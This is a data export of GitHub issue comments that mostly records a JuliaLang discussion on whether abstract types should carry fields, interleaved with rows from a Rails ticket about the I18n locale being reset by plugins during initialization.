julia/JuliaLang/4935/31874352,"Following up Point 1, part of the appeal of abstract types with fields is that they define a kind of interface you know all subtypes will support. For example, linear regression, logistic regression, SVM's and other models all will have a specific weight vector that you'd like to be sure is available. Whether it's through a field or a function is much less important than checking that the implementation satisfies the stated protocol. ",,False,False,4935
julia/JuliaLang/4935/31874539,"To that end, I think that having a formalization of protocols/interfaces is much more useful and important than fields for abstract types, which only addresses a tiny portion of this much bigger issue. ",,False,False,4935
julia/JuliaLang/4935/31874693,I agree that it's much more important. But there is something nice about the minimal typing required when you have a lot of concrete types that are small variants on a parent abstract type that has almost all of the fields that concrete types will need. ,,False,False,4935
julia/JuliaLang/4935/31878085,"I would say I'm on the ""probably don't need this"" side. If it's really just saving some typing, I don't think it's worth it. I think not having this in addition to the great feature of no sub-typing concrete types makes for very legible code. I think it's been mentioned many times that one of Julia's strengths is the code readability and having a type's fields not be explicit seems like a bummer to me. Any time I see a type that sub-types, I then have to track down that type's parent, moving up the chain until I finally parse all the fields this type happens to inherit. That or use , which also feels a little clunky. ",,False,False,4935
julia/JuliaLang/4935/31880918,"Right, John, I see your point about minimal typing but my stance on this was to still require specifying the fields, which would completely undermine that benefit. I'm still not convinced of any design here that actually would reduce typing at all. ",,False,False,4935
julia/JuliaLang/4935/31882161,"ok, so if we don't need this how i would solve the problem i had that originally led me to this page? i am writing an api - say, for genetic algorithms - and i have a data structure (a type) that is passed to several functions.  this structure will contain information that the ""general"" genetic algorithm uses (a population, parameters describing how to breed, etc) and also some customizable information that the api user should add. so, when i write the library, i know some ""part"" of this data structure, but not others.  other parts will be extended by the library user.  for example, they might need to store some parameters that are needed to generate new individuals. at the function level, i can structure this just fine.  i write my ""general"" functions that do the tasks of breeding, etc.  the user writes functions (with a name i choose) that i call from my code when i want to create new instances (for example).  the user function is passed this same data structure. but at the type level, i don't understand how i can do this without what was described here.  i need to pre-define some fields, which are used by the library code.  the user needs to extend that with other fields after the library is written. if we don't have fields on abstract types, how do we solve the above elegantly? [what i ended up doing was adding a single field, which the user can extend.  so the user then defines their own structure and stores it there.  that works, but it seems clunky to me - for example, it makes extension by two parties at once difficult, since they must agree between themselves what this single extra thing is.  but maybe that's the best that is possible in julia.  i just wanted to set out a clear example in case people are missing a use case...] [i am also worried about ""Whether it's through a field or a function is much less important..."" since functions are not context-dependent in the same way as data (and closures cannot be assigned to package functions, as far as i can see).  in other words, if you're calling the library twice, how do you make functions specific to a particular call?] finally, i think a more formal way of saying the above is that this is the ""expression problem"" (wadler et al).  although i haven't looked at that in some time and may be wrong. ",,False,False,4935
julia/JuliaLang/4935/31886415,"I think the point is that one has to repeat the getter/setter methods for all(!) child types of an abstract type. Using this proposal one only need the abstract type definition with fields and is done. To @friend concern with the ""lost field"" when overriding. I think in most situations the overriden field is still in use. I use in C# properties a lot in the following way double myProperty; double MyProperty {   get { return myProperty; }   set    {     // perform a range check to look if value is in a valid range (e.g. &gt; 0)     myProperty = value;     // update some dependent properties   } }  In the combination with the GUI toolkit WPF these properties can be bound to GUI elements, which makes it very convenient in practice. Without this, the relevance of this feature might not be so high. ",,False,False,4935
julia/JuliaLang/4935/31894186,"The most specific version of a function gets called for each set of arguments. By defining a method for the abstract type, it will be used for all child types, unless there's an even more specific definition. ",,False,False,4935
julia/JuliaLang/4935/31898941,"As discussed earlier today with @friend A concrete example for which this could be useful would be to simplify defining methods for , , , , and a future hypothetical  matrix types. Each of these matrix types would require a field for the diagonal elements. Most of these would need also at least one sub/superdiagonal field, and quite possibly more. A hypothetical supertype of these particular matrix types would simplify the implementation of basic linear algebra functions. For example,  should retrieve the appropriate super/sub/diagonal field, or otherwise generate a zero vector of the correct length. ",,False,False,4935
julia/JuliaLang/4935/31900231,"I'll mention that a definition like this is valid, since we don't strictly check things Then each subtype just has to have a field of that name. ",,False,False,4935
julia/JuliaLang/4935/31905711,"I looked through this entire thread. I am still not convinced that abstract type with fields is necessary. I have worked on a dozen of Julia packages, and doesn't come across a single time where I want a super-type to enforce that all subtypes have to share some common fields. There are plenty of cases that one would want to enforce that all subtypes can provide information of some sort. However, all these can be done through (multi-dispatch) methods instead of fields. Requiring methods to be implemented is far more flexible than requiring the presence of a particular set of fields. The following example should illustrate this point. A common information that should be provided by all kinds of matrices is the number of rows &amp; columns. Then, should we do the following? Of course not. There are numerous ways to represent the shape, and using two integers is just one of them. For example, I can use a tuple or a vector, etc, or if I want to implement a SquareMatrix type, I can just use one integer to represent the shape. I think the current Julian way does this right -- it requires the size(a, d) method to be implemented instead of requiring what fields should be present. To me, fields are almost always about implementation details. Interface should be expressed using methods. Abstract types with fields are kind of making the fields part of the programming interface (API). I am yet to be convinced that this is a good idea. Using fields in abstract types also make things unnecessarily complicated. What if the subtype want the fields to be of different types than those being declared in the abstract type? ",,False,False,4935
julia/JuliaLang/4935/31905898,"People mentioned the usefulness to allow properties to be inherited. I agree with this. However, properties are more like methods than fields. ",,False,False,4935
julia/JuliaLang/4935/31906120,"In terms of saving typing, one can always use macros. If you find your self writing a lot of types that share a subset of fields, you can write a macro to generate those shared parts so that you don't have to repeat them many times. ",,False,False,4935
julia/JuliaLang/4935/31906308,I now agree this is a kind of marginal feature. It's easy to misuse; as you point out it's undesirable for read-only properties. ,,False,False,4935
julia/JuliaLang/4935/31912957,"@friend I wanted to come up with an example like that one that @friend provided, which I thought would not be possible. Is that pattern used anywhere in the Julia source code? In combination with field overloads this could be very interesting. One could provide default implementations on abstract types that make certain assumptions on the fields available. A concrete type either has provide the field or provide an equivalent field overload. I kind of agree with @friend that currenty methods are used as public interfaces while fields are implementation details. Making fields overloadable can break this view. Then the fields/properties can become part of the interface. In C# usually the convention is used that properties start with an upper case letter to make clear that this is part of the interface. I am actually not totally sure if we need properties in Julia. The nice thing about them is a) the point syntax b) that getter and setter have the same name. b) might not be that important in Julia as we have this nice ! notation. So one could define properties as wheel( car ) # gets the wheel wheel!( car, anotherWheel ) #sets the wheel in car ",,False,False,4935
julia/JuliaLang/4935/31914678,The dot syntax seems to be a really huge deal for many people. It is arguably one of the most popular bits of syntax among all modern languages. Modern languages need to support dot-oriented programming ) ,,False,False,4935
julia/JuliaLang/4935/31915403,"Well, from my point of view it is a plus that Julia does not support the dot syntax for member functions. But fields and properties are a different thing these are things that definately belong to an object. But on the other hand it would be kind of consequent to not allow field overloads and do all getters/setters with methods like I outlined above. Then one has a cleaner separation between what is an interface and what is the implementation detail ",,False,False,4935
julia/JuliaLang/4935/31915833,"I agree that many properties should be methods, like . I would like to add dot overloading, but I don't want to see a profusion of things like  as a replacement for these. ",,False,False,4935
julia/JuliaLang/4935/31916892,"If something like getfield(AMyAbstractType, Field{x}) = 0  can be done, then nothing stops one to start doing at the beginning of the code getfield{S}(oAny, Field{S}) = @friend $S($o)  and do a = [1 2; 3 4] a.size  everywhere. ( How I tested it abstract Field{S} getfield{S}(oAny, Type{Field{S}}) = @friend $S($o) a = [1 2; 3 4] getfield(a, Field{size})  ( When I first arrive at Julia, I tried to do something like that (because I though Julia dot syntax was broken D )) ",,False,False,4935
julia/JuliaLang/4935/31916898,That is the danger. The C# developer in me wants it but it will break the view that fields are implementation details. Maybe it needs a more well defined use case. I think @friend wanted this for pycall. ,,False,False,4935
julia/JuliaLang/4935/31917591,That hack fills me with dread. Not to mention that  would probably just break the whole system. ,,False,False,4935
julia/JuliaLang/4935/31922402,"If you give it a try, you'll see it works. (Images uses this technique.) There is no compile-time guarantee that the fields are there, but if they are not you'll get a clear run-time error, and to me that seems adequate. ",,False,False,4935
julia/JuliaLang/4935/31924536,"Yes, and I want it for the same reason in JavaCall. ",,False,False,4935
julia/JuliaLang/4935/32106917,"I had a few different implementations of an OrderedDict which were only slight modification of Base.Dict. One version (#2548) of this added an AbstractDict class above Dict and OrderedDict, which basically assumed that most of the current fields of Dict existed, and added two or three more for OrderedDicts. Jeff didn't like that at the time (see his comment in #2548), although without allowing fields in abstract types, that would probably be the most efficient way forward. ",,False,False,4935
julia/JuliaLang/4935/33198345,"I have another datapoint for a use case where this would be very handy. I think that the general concept is when the operations defined on the abstract type require some state to be attached to the object (which is what @friend mentioned above) In AudioIO.jl the audio processing is implemented by creating a graph of AudioNode subtypes that each implement their own  function to generate audio (e.g.  renders a sinusoid,  calls the render function on all of its inputs and mixes them together). I wanted to enable waiting on AudioNodes, so I implemented , which waits on a Condition stored with the object. In order to do this I had to track down all the concrete subtypes and add the condition field to all of them. That's manageable if they're all implemented in this module, but as the number of AudioNode types grows and possibly becomes split across different libraries it's infeasible to have to go in and add a field to all of them. Allowing fields on abstract types seems like a win in this case, but there are alternatives  Do what I'm doing now which is to manually define all required fields in each subtype. This is error-prone, it's easy to forget one, and it especially problematic across libraries Create a AudioNodeState type, and all subtypes are required to have a field . That way if I add behavior to AudioNode that requires some state I can add it to the AudioNodeState definition. This actually seems like a pretty good solution that's conceptually simple and explicit. There's only one thing for subtype implementers to remember, and if they forget to add the field it will get found out the first time any state is accessed. Add a macro that defines the proper fields. This feels more magical than  and doesn't seem to gain much. Make AudioNode a concrete parametric type with the specific renderer contained as a field within, like  This feels a little heavy/complicated, but probably worth trying on for size. Given that we have a couple of seemingly pretty-good options, I'm actually less convinced than I was before that fields on abstract types are the right fix for this problem. It seems like having fewer patterns to choose from is a good thing, and I definitely agree with @friend that the locality and explicitness of Julia type declarations makes the code a lot easier to read. Thanks @friend and @friend for the discussion and ideas today, which helped to crystalize a lot of this. ",,False,False,4935
julia/JuliaLang/4935/33198915,"I think the 2nd and the 4th alternatives are the most julian ones. And for this particular case, the 4th option seems to be the most meaningful. ",,False,False,4935
julia/JuliaLang/4935/38521684,"Somehow I hadn't seen this thread. I somewhat feel like most of the requests for it are from people writing inter-op code for these other languages. (although this is off-topic for this thread) Let's close this issue then. I've never felt it would be a significant savings in any of my code. And it further confuses the difference between the ""thing"" -- a  -- and the behavior -- the . If anything, I would propose trying to make those more distinct (but that's a different topic for later). ",,False,False,4935
julia/JuliaLang/4935/39014385,"Also late to the party ) One of the common use-cases put forward for fields on abstract types is to provide some base data and implementation that user code extends by derivation. But instead of derivation, isn't the Julian way to do this to make a generic type with the part the user adds being a type parameter. Then you separate the basic functionality and the extension parts cleanly, you properly express that the basic functionality can't be used without the extended functionality, you create an appropriate concrete type when its extended, and you even save typing ) ",,False,False,4935
julia/JuliaLang/4935/39918651,"instead of , what if this were reversed ? same underlying machinery, but the user can choose whether to inherit the fields or replace them (extending the fields is not allowed.  is not allowed). this avoids the two pitfalls of forcing the user to have fields they don't actually need and constructor dependencies. inner constructors would be inherited also i think this would make wrapping Gtk.jl much nicer and user-friendly, since Gtk has many of these inheritable concrete types. On the Julia side, most of these simply have a  field in julia (and an identical constructor), but a few of which have something else. ",,False,False,4935
julia/JuliaLang/4935/39970113,"An example of how this will be useful is in creating an . Julia immutable FinancialTimeSeries{T&lt;Float64,N} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type OrderBook{T&lt;ASCIIString,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type Blotter{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free instrumentStock end type FinancialPortfolio{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free blottersVector{Blotter} end type FinancialAccount{T&lt;Float64,2} &lt; AbstractTimeSeries 3 fields plus inner constructor for free portfoliosVector{FinancialPortfolio} end ♠` Though I likely mucked up the syntax, the basic idea is that new custom time series types are easy to construct, and new fields can be added. ",,False,False,4935
julia/JuliaLang/4935/39975009,Would we allow new inner constructors in the derived type? Would  in the derived type invoke an inner constructor of the base type? ,,False,False,4935
julia/JuliaLang/4935/39976547,"Yes, I would think it useful to add invariants, but every derived type would at least have the abstract invariants, which includes the length of the time array matches size(values,1) and colnames matches size(values,2), as well as dates must be sequential and in descending order. ",,False,False,4935
julia/JuliaLang/4935/40065432,"just to be clear, my proposal explicitly disallows partial inheritance of fields. it is strictly limited to selectively allowing concrete types to be used as abstract type names. (with special syntax to indicate that the derived class has exactly the same fields and constructors as the original type) ",,False,False,4935
julia/JuliaLang/4935/40132318,"I think that we have considered abstract types with fields in the context of trying to solve a number of different problems, but looking at this discussion it seems to me that if they should be used for anything, it should be to address the cases where you would currently create either  a parametric type with a specialization field or (the subtype's data is a field in the supertype) a common type that would be used for the same named field in each of the subtypes (the supertype's data is a field in each subtype)  (alternatives 4 and 2 above from @friend respectively), because you want to create a family of types with some common storage and behavior. ",,False,False,4935
julia/JuliaLang/4935/40133520,"Once upon a time, there was an idea to disallow field access such as  in all cases except when the concrete type of  was statically known. If you didn't know the type of  when you wrote the code, how could you know what its fields signify? The way I understand it, this restriction was not implemented because it was deemed too useful to be able to have a family of types containing some same named fields. But this seems to be exactly what abstract types with fields would address! How about restricting field access like  to cases where it is statically known that  exists? The statically known type of  need not be concrete, as long as the fields in question would exist in it. To ensure the separation between abstract type and subtypes, access to the fields of the abstract type could require that that type be used, not just a subtype of it. This would give a complete namespace separation between the fields of the supertype and subtype. It could go a long way to avoiding the fragile base class problem, by forcing a proper interface between supertype and subtype. Of course, it remains to be defined what the statically known type of an expression would mean. ",,False,False,4935
julia/JuliaLang/4935/40238479,"Once we make  syntax overloadable then it will be just like writing . We never statically disallow generic function application, but this would be the only place in the language where we do that? That doesn't really make any sense. ",,False,False,4935
julia/JuliaLang/4935/40272349,"I will readily admit that I'm not at all convinced that this is the way forward. What troubles me most is  introducing and defining an entirely new mechanism in the language. Still, I find the idea interesting enough to investigate it a bit further I agree that we shouldn't statically disallow generic function application. Another way would be that, instead of having  as syntactic sugar for , to make it stand for getfield(a, Field(b), static_type_of_a)  where the last argument gives the static type that the field is looked up in. Actual fields would correspond to signatures like getfield(aA, Field(b), Type{A}) = ...  # implicitly created for field b in type A  so that they could only be accessed using the same type as they were defined in. Properties, on the other hand, could and probably would be made to apply for a range of static types, i.e. getfield(aA, Field(myproperty), Type) = ...   getfield{T&lt;MySuperType}(aA, Field(myproperty), Type{T}) = ...    to make them available regardless of static type, or given any static type  respectively. This is still different from the mechanisms that exist now. The reason to make it different would be that access to actual fields (not properties) is different - it is an implementation detail and not an interface. But I am still not sure whether it would be worth it. ",,False,False,4935
julia/JuliaLang/4935/40281190,"That's why this whole issue gives me pause. Inheritance in Julia is about behavior, not structure. And that's a good thing. Conflating inheritance of behavior and inheritance of structure is precisely the mistake that C++, Java, et al. have made and it causes all sorts of problems. It may make sense to introduce some mechanism for structural inheritance in Julia, but I don't think it should be confused with – or tied to – behavioral inheritance. ",,False,False,4935
julia/JuliaLang/4935/40300112,"Yes, I think you are right. If it shouldn't be tied to behavioral inheritance, then I guess it shouldn't be tied to subtyping at all. It would be interesting if we could come up with a way to address the family-of-similar-types problems that have been discussed here that is not tied to subtyping, but I suppose that this issue is not the forum to discuss it. ",,False,False,4935
julia/JuliaLang/4935/40309190,The distinction between inherited behavior and not structure is useful in navigating how to think about this problem. I was certainly getting lost in the thread before you spelled it out that way. ,,False,False,4935
julia/JuliaLang/4935/40340113,"In my point of view this PR is closely relate to #1974 and #5. If we decide field overloading should not be done this PR makes a lot more sense. While I agree about behavior vs. structure thing, there are cases like Gtk.jl as Jameson mentioned where abstract types with fields are handy. But #4935, #1974 and #5 should be seen in shared context. Abstract multiple inheritance and a way to define (and check) interfaces in a formal way is IMHO the most important of these issues. ",,False,False,4935
julia/JuliaLang/4935/47390727,"I'd like to point out that the decision to disallow concrete type inheritance may also be supported by the fact the in the c++ world inheriting from concrete types is considered conceptually problematic, too ""Item 33 Make non-leaf classes abstract"" ",,False,False,4935
julia/JuliaLang/4935/47426980,"@friend Coming from the c++ world I disagree. The design the author chooses from that article doesn't look like a good design to me, but I don't see how it argues against inheriting from concrete types. There are plenty of places in both the standard libraries, semi-official libraries (e.g. boost), and others which use inheritance. In fact if you don't allow inheritance from concrete types you essentially have Java's interfaces. There are many complaints you can find for why this can make for bad design. I understand the arguments against multiple inheritance with concrete types. That's why some languages like Ruby, Scala, and Swift have some concept of mix-ins. ",,False,False,4935
julia/JuliaLang/4935/47428318,"My view is that inheriting from concrete types is illogical. This fact then manifests itself as problems in various flavors depending on the language. Definitely the specific problem described in the c++ article does not affect Julia, but I thought it might be useful to provide a broader context for the question. The article is an excerpt from Scott Meyers ""More Effective C++"". In my opinion, it makes sense to subtype concrete types only if the subtype specifies a subset of the already given possible values of the type being subtyped. Subtyping Int64 to get the type of e.g. even numbers would be OK. I am for abstract types with fields and interfaces. ",,False,False,4935
julia/JuliaLang/4935/47428512,"I think many problems of various languages related to inheritance are due to not separating ""conceptual"" and implementation inheritance well enough. In this respect, Julia is in my opinion very well designed. Nevertheless, things like multiple abstract inheritance and interface specifications (of which fields in abstract types are a special case) would make the design more ""complete"". ",,False,False,4935
rails/rails/703/904383,"Imported from Lighthouse. Original ticket at  by Nicolas Blanco - 2011-02-17 064814 UTC How to reproduce  Create a new Rails 3 beta 4 app, set the default_locale to fr (or whatever) in application.rb (and put the correct yml file). Run a rails console. Check that I18n.locale is the right default_locale you've just set. Now create a fake plugin  create a folder ""foo"" in vendor/plugins, create the file vendor/plugins/foo/init.rb with a call to I18n.translate in it, like  Run the Rails console in development mode and in production mode. In my case the locale is reset to en. This is a problem because many gems and plugins use I18n.t for example translating error messages in models... Note  this problem does not occur in Rails 2.3.x. ",,False,False,703
julia/JuliaLang/4935/47428699,@friend but would you consider the fields to be part of a public or private interface? My take is that multiple abstract inheritance and public interface specifications are the most important issues to be solved in this area. Private interface specifications (which this issue is IMHO about) are neat but also make the language more complex. ,,False,False,4935
rails/rails/703/1170350,"Imported from Lighthouse. Comment by Falk Pauser - 2010-08-18 154755 UTC I am using rails3-rc1 and have a similar issue. In config/application.rb I set config.i18n.default_locale = de after putting a de.yml into ""config/locales"". In development-mode everything is just fine, I18n.locale and I18n.default_locale return de in rails-console. At the production-server I18n.default_locale is de too, but I18n.locale gives en without any obvious reason... ",,False,False,703
julia/JuliaLang/4935/47432239,@friend For Julia I'll agree with you (I think subclass from concretes works okay for languages like C++ and Python). I agree with your other statements. ,,False,False,4935
rails/rails/703/1170351,"Imported from Lighthouse. Comment by Falk Pauser - 2010-08-19 084941 UTC Just tried the current ""3-0-stable"" branch - same effect. ",,False,False,703
julia/JuliaLang/4935/47432556,"@friend  I might be wrong, but it seems like the private/public debate is a separate issue. You could assume for now everything is public without breaking anything. ",,False,False,4935
rails/rails/703/1170352,Imported from Lighthouse. Comment by Nicolas Blanco - 2010-08-21 184704 UTC The only workaround I've found in to set the locale again in an initializer... bad... ,,False,False,703
julia/JuliaLang/4935/47435534,"AFAIK, at the moment type-fields are considered private and the function-interface is public.  For instance, it's  and not . ",,False,False,4935
rails/rails/703/1170353,"Imported from Lighthouse. Comment by cabgfx - 2010-09-11 161429 UTC Hi, I've experienced the same problem, with Rails 3.0.0. My app also bundles authlogic 2.1.6, which seems to cause the effect. I've fixed it for now, by brute-forcing config.i18n.locale = da, in /config/environments/production.rb. I'd assume this shouldn't be necessary, since I already have config.i18n.default_locale set in /config/application.rb ? This issue has also been discussed on the Google Group ",,False,False,703
julia/JuliaLang/4935/47437697,"I don't think that the private/public debate is a separate issue. This is the key issue when we talk about overloading Note that this of course only applies to mutable types. For immutables, the fields are the public interface. ",,False,False,4935
rails/rails/703/1170354,"Imported from Lighthouse. Comment by Robert Pankowecki - 2010-09-11 185240 UTC When 'rails c' is run you can see That is because you try to translate sth in plugin init.rb file and the translation is done until I18n configuration is fully loaded. Furthermore; using rails c shows that the available_locales' are cached in the I18n library the first time they are used as you can see. In other words Gem or plugin should not try to translate anything until all initializers are run. I would say it is gem/plugin or I18n fault, not rails. ",,False,False,703
julia/JuliaLang/4935/47440150,"I can see where it is an issue for overloading the  operator, but is it also an issue for abstract types with fields? ",,False,False,4935
rails/rails/703/1170355,Imported from Lighthouse. Comment by David Trasbo - 2010-09-11 211035 UTC I definitely agree with Robert. It's not Rails' fault and this can almost certainly be closed. ,,False,False,703
julia/JuliaLang/4935/47440897,"There needs to be a separation between interface and implementation.  ATM they are the same thing, so any inheritance (meaning is-a) also would inherit the fields of the abstract type, an implementation artifact.  But the derived type may wish to provide a completely different implementation.   So the two things need to be separated.  That is where most languages fall down and Julia has the chance to get it right. ",,False,False,4935
rails/rails/703/1170356,"Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 134533 UTC This is a sad attitude. This remembers me the way Grails developers treat their issues. They provide GORM for ORM but rely on Hibernate and when there is some issue with GORM the mark the issue as ""won't fix"" because this is Hibernate fault, not Grails' as if the user had the chance to use another framework with GORM. I18n is the only supported way of adding internationalization support to Rails. It just happens that it is a separate gem that Rails is taking advantage of, but if i18n is broken in Rails it doesn't mean it is not Rails fault and that issues should be marked as invalid. If the i18n gem is not good enough for Rails (which is not the case), then should think in another way of getting i18n in Rails. Not simply telling it doesn't care about i18n and it won't try to fix any related issues even if the source isn't exactly in rails repository. Besides that, it is not clear to me that this is a i18n issue instead of a Rails one. I still think the problem is in Rails, not on i18n itself. Rails should assure the order in which the calls are done to ensure the plugins will have i18n loaded before their initialization code gets executed... ",,False,False,703
rails/rails/703/1170357,"Imported from Lighthouse. Comment by Rohit Arondekar - 2010-09-12 140021 UTC Rodrigo, firstly I'm not a core member so the issue is not closed forever! ) Secondly, I apologize, I did rush through the ticket. Also I usually leave a friendly ""closing now, if you still think this is an issue then leave a comment and I'll reopen it"" comment while closing an issue. Assigning ticket to an author of the i18n gem for confirmation as to whether this is a i18n issue, gem/plugin issue or an issue with Rails. In the mean time if it's at all possible can you try writing a failing test for rails? That's usually the best way to demonstrate that it's a Rails issue. ",,False,False,703
julia/JuliaLang/4935/47450972,"@friend You are absolutely right that interface and implementation have to be separated. If we say that only functions are the interface (e.g. , , ... of an AbstractArray) then the fields are implementation details. The abstract types with fields would however not really hurt this thinking. They would just be a convenient feature in some very OO-like situations. AbstractArray would not be such a thing. Personally I would avoid situations with deep inheritance hierarchies where abstract types with fields (heck we need an abbreviation for it ATWF) are really needed. But here we get into a subjective area and if @friend likes this programming style I don't really see the issue with this feature. ",,False,False,4935
rails/rails/703/1170359,"Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 141339 UTC Hi Rohit, thank you for reopening the ticket. I've actually isolated the problem in June 14 (one day after my birthday ) ), in the Google Group discussion commented by cabgfx. We don't even need any plugin for reproducing the issue. I'm just not sure how to write some test of this kind. If someone could suggest me any approach (what subproject, and how to simulate Rails loading, preferencially in a fast way that won't impact too much on test run speed) I could try to write one... ",,False,False,703
julia/JuliaLang/4935/47451393,"I think the following example is worth discussing We have an  type and want to extent it with physical dimensions Solution a) Introduce a new  type that has as field an ordinary  and a tuple of spacings. Problem We have to forward all the methods. Solution b) Let the entire  implementation ""open"" and define all the methods for the abstract type with fields . Then a trival concretization gives us our  type.  could now be derived from  in the same way ( with trivial concretization . While I am personally more a fan of solution a) I can absolutely understand that people also like b). It would certainly make the language a little larger. But I am not sure if this is such an issue at this front where it is hard to force people to use a certain programming style. ",,False,False,4935
rails/rails/703/1170360,Imported from Lighthouse. Comment by Ryan Bigg - 2010-10-09 205519 UTC Automatic cleanup of spam. ,,False,False,703
julia/JuliaLang/4935/47455460,"@friend, (a) seems like a more flexible approach, and with a  helper macro (#3292) it need not be so difficult as it is now. ",,False,False,4935
rails/rails/703/1170361,Imported from Lighthouse. Comment by Roger Campos - 2011-02-25 224913 UTC This commit from Saimon Moore maybe should fix this ticket. ,,False,False,703
julia/JuliaLang/4935/47456926,@friend I think issue #7442 shows a fair example of wanting abstract types with fields without having a deep hierarchy. Besides grouping (which requires a lot of boiler-plate functions) or copying of code (which violates DRY) I don't see a good way to implement those classes. ,,False,False,4935
julia/JuliaLang/4935/47462524,@friend I am absolutely in line with you. I am just not sure if this has a clear better / worse answer or if this is about taste. @friend is apparently of a different opinion and I was not able to convince him that (a) is a clean solution. ,,False,False,4935
julia/JuliaLang/4935/47516249,I think how well (a) works depends on the number of fields defined. In #7442 I tried both copying the variables and forwarding. Even with a small number of variables both involve writing a lot of extra code -- imagine the non-simplified version with many more fields. ,,False,False,4935
julia/JuliaLang/4935/47522051,"Abe, I know that we are going full circle now, but for completeness here is the version that uses the  relation. abstract Player  type PlayerFields   positionArray{Float64, 1}   rotationFloat64    end  type PlayerA &lt; Player   basePlayerFields   nameString   PlayerA() = new( PlayerFields([0.0, 0.0], pi),  ""foo"" ) end  type PlayerB &lt; Player    basePlayerFields    PlayerB(posArray{Float64, 1}, rotFloat64) = new(PlayerFields(pos, rot)) end  move!(playerPlayer, velocityArray{Float64, 1}, dtFloat64)   player.base.position += velocity*dt end  a = PlayerA() b = PlayerB([10.0, 10.0], -pi) move!(a, [0.1, -0.1], 0.1) move!(b, [0.1, -0.1], 0.1)  You might not like it but it seems that many Julia developers got used to this. Typically the  type is not so artifical but stands on its own. Just one other side note. In C++ inheriting from stl-containers is not encouraged. This has of course again specific C++ reasons but it is yet another example where  is favored. ",,False,False,4935
julia/JuliaLang/4935/47533739,"@friend You can do that (and I think that's also in #7442), but then you have to know that every player has a field named . This seems like something a compiler should enforce. You can get around that problem (also in #7442) by defining an interface with methods, but then you have a ton of extra code that you have to write. Both approach seem sub-optimal to me and a place where the compiler can help out. This could potentially provide better error messages, opportunities at optimization, and cleaner code. The thing with c++ is it that it tries very hard to be paradigm free. There are specific cases where you don't want inheritance. But it's no uncommon to employ inheritance with templates (especially template hacking). Most of the time you only ever want to use single inheritance, except for those times you really need multiple inheritance. I think that's what makes it such as successful language -- it tries not to impose its ideals on you (some Java did entirely incorrectly, IMHO). ",,False,False,4935
julia/JuliaLang/4935/47561581,"We generally take the approach that features that serve to constrain what the programmer can do are unimportant, while features that allow programmers to do more things more easily are very important. Arguing for features so that the compiler can prevent people from doing things is unlikely to be particularly persuasive around here – that's just not the Julian attitude. ",,False,False,4935
julia/JuliaLang/4935/47602015,"@friend I think this is very much the case of helping the user out, and I probably should not have used the word 'enforce'. I don't see how adding fields to abstract types would in any way constraint the user. ",,False,False,4935
julia/JuliaLang/4935/47614543,"Right, the feature part doesn't at all constrain the user. But, if the main point of the feature is to tell the programmer when they got something wrong, then that's the limitation thing again. I was all for this until I realized that all it saved was a bit of typing and means that a subtype of an abstract type with fields cannot not have those fields – and it's entirely plausible that a subtype might decide that it wants to store the fields that the supertype declared in a different way, such as part of the type or computed from other fields. This comes down to inheriting structure versus behavior. Inheriting structure is restrictive, while inheriting behavior is not. ",,False,False,4935
julia/JuliaLang/4935/47615626,"Agree with @friend plus one for not requiring subtypes to inherit fields. Given Julia's target market, fields being large arrays will be likely to naturally occur, so forcing subtypes to inherit them would be costly if the subtype doesn't need them. ",,False,False,4935
julia/JuliaLang/4935/47615947,"@friend, I'm a little confused by this point. Since I don't believe it will be possible to instantiate abstract types, it's not obvious to me how the size of arrays (a property of objects, not of types) could pass between abstract types and concrete types. Did I miss part of the conversation? ",,False,False,4935
julia/JuliaLang/4935/47616450,"@friend as I understand the discussion it is about allowing abstract types to have fields that can be inherited by subtypes and at some point a concrete type that can be instantiated with those fields. The point is that requiring the inheritance of such fields could be expensive if the field is an array, but the methods on the concrete type did not use that information, as @friend said. ",,False,False,4935
julia/JuliaLang/4935/47647700,"@friend But you can always choose not to put fields in the abstract type. It's only there if the design calls for it. @friend Likewise, if not all concrete types require that array, it shouldn't be in the abstract type. You should only have the fields that are common to all concrete types. If you use the grouping technique as suggested before (i.e. make another type that collects all common fields) you have the exact same problem. But if you don't group in a common type then you potentially have to copy and paste code in order to make sure no field name changes. ",,False,False,4935
julia/JuliaLang/4935/47650815,"@friend that presumes that a hierarchy is designed at one time by one group who ""control"" the entire hierarchy.  But one of the key things about Julia is the existence of a package system to publish such hierarchies for use by others. To the initial designer of the abstract type provided by a package it may make perfect sense to include fields in line with their initial use-case.  But Julia users can create their own subtypes adding implementations that the original abstract type designer never thought of. Forcing fields to be inherited may impose unreasonable costs on the new implementation.  But since some other users of the abstract type may use the inherited fields, they cannot simply be removed without breakage. It should be up to the subtype implementation to decide if it needs to inherit the fields from the parent type.  It is of course then the subtype implementer's responsibility to overload any parent method that uses fields they do not inherit. ",,False,False,4935
julia/JuliaLang/4935/47765102,"@friend That's true with many other languages besides Julia (e.g. Python and Ruby). A library could in theory do something like This gives the most flexibility as it  Doesn't impose fields in the way that you are worried about Provides a method to write more generalizable code (i.e. you know the fields exist in the method so you don't have to (a) check the existence of the field, or (b) deal with errors if the field doesn't exist).  ",,False,False,4935
julia/JuliaLang/4935/47895265,"I have a type named  that wants to reuse all the available methods in the  type found in the TimeSeries package. Here is the current  design needs some more information (stock ticker, tick size, currency, etc) so to achieve this there are three alternatives. The first one simply copies the  code and extends it. The only method that is reusable is the  method. metadataTimeArrayjulia immutable TimeArray{T,N,M} &lt; AbstractTimeSeries     timestampVector{Dates}     valuesArray{T,N}     colnamesVector{UTF8string}     metadataM end The problem with is nesting is that you would need to redefine  and other methods. This can be done with one-liners though So now we we have a nested type that includes a nested type. Does this cause a performance hit? I would imagine so but I haven't tried it to find out. ",,False,False,4935
julia/JuliaLang/4935/47896801,"@friend My point was that allowing fields in abstract types doesn't impose any constraints on the user. I don't think it's difficult to imagine a realistic example given in #7442 with 5-10 more fields, at which point the design you gave above becomes difficult to maintain if you have a decent number of  subtypes. One project I'm working on has just that. @friend also posted another example while I was typing my response. It may not come up a lot on the mailing lists, but I don't think that doesn't mean it isn't useful (or there aren't people who would use it). Also, multiple inheritance, which you have argued for (and I agree with), only shows a handful of hits when I search on the Julia user list. The problem with using methods to define the public interface is that the compiler isn't doing any checks for you. Sure, you know the method exists, but you don't know if the subtypes actually have fields you are accessing. Thus, you will only find the error at runtime, and are therefore just moving the problem around, but not actually solving it. ",,False,False,4935
